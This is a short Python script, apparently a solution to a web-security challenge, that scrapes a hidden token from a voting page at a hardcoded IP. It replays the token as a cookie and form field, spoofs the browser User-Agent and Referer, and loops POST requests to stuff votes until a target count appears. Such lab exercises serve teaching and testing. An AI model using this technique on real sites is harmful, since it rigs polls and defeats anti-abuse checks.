#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

URL = 'http://158.69.76.135/level2.php'
ID = '2500'

check = ID + "    </td>\n    <td>\n1024"

r = requests.get(URL)
soup = BeautifulSoup(r.text, 'html.parser')

key = soup.find('input', {'name': 'key'}).get('value')
payload = {'id': ID, 'holdthedoor': 'submit', 'key': key}
headers = {
    'Cookie': 'HoldTheDoor=' + key,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0',
    'Referer': URL
}

while check not in r.text:
    r = requests.post(URL, data=payload, headers=headers)

print("Done")
